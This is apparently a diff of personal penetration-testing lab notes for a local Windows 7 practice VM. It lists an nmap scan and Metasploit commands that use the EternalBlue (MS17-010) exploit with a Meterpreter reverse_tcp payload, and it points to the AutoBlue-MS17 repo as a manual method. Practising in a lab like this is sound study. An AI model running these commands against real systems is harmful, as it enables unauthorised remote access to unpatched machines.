@@ -15,3 +15,36 @@ setting up the virutal machine for practice using virutal box
 THE MACHINE IP ADDRESS IS 192.168.138.135
 
 $nmap -p- -T4 192.168.138.135
+
+(open ports 135,139,445) (win 7 ultimate 7601 service)
+
+With metasploit:
+
+$msfconsole
+$search eternalblue
+$use 1
+$options
+$set rhosts 192.168.138.135
+$run
+
+$use 3
+$options
+$set rhosts 192.168.138.135
+$check
+$set payload windows/X64/meterpreter/reverse_tcp
+$options
+$set lhosts 192.168.138.128 (our ip)
+$run
+
+Gained access
+
+MANUAL METHOD:
+
+ETERNALBLUE github repo 3ndG4me/AutoBlue-MS17
+
+------------------------------------------------------------------SETUP - ACADEMY-----------------------------------------------------
+IMPORT the machine in the virutal box
+
+----------------------------------------------------------------WALKTHROUGH - ACADEMY---------------------------------------------
+
+
